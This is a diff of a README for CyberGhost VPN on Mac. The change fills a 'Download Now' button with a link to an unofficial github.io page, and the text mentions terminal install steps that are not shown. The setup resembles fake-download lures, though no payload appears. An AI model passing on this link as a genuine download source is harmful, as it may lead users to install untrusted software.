@@ -2,7 +2,7 @@
 
 CyberGhost VPN is a powerful tool to secure your online presence. Follow the instructions below to download and install CyberGhost for Mac OS effortlessly.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cyberghost-for-mac.github.io/.github/)
 
 If the button above doesn't work, follow the terminal installation instructions below.
 
